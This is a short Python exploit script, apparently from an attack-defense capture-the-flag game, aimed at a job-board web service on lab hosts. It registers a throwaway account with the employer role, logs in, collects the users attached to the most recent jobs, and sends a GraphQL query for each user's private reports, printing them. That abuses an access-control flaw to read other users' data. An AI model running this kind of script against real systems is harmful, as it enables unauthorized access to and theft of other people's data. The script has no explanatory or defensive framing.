#!/usr/bin/env python3

import requests
import re
import sys
import socket
import random
import string

#IP = sys.argv[1]
PORT = 8080
#hosts = ["192.168.100.3", "192.168.100.4", "192.168.100.5", "192.168.100.6", "192.168.100.8"]
hosts = ["192.168.100.3"]

def random_string():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))


try:
    username = random_string()
    password = random_string()
    for host in hosts:
        s = requests.Session()
        data = {"username":username,"password":password, "description":"", "role":"EMPLOYER"}
        r = s.post(f'http://{host}:{PORT}/register', json=data)
        data = {"username":username,"password":password}
        r = s.post(f'http://{host}:{PORT}/login', json=data)
        headers = {
            'Authorization':f'Bearer {r.json()["token"]}',
        }
        r = s.get(f'http://{host}:{PORT}/jobs', headers=headers)
        lastJobs = [*r.json()[-5:]]
        users = set()
        for job in lastJobs:
            for user in job["users"]:
                users.add(user)
        for user in users:
            data = {
                "query": "{reports(user: \"" + user + "\"){title description url user userId}}"
            }
            r = s.get(f'http://{host}:{PORT}/report', json=data, headers=headers)
            print(r.text)
        

except Exception as e:
    print(e)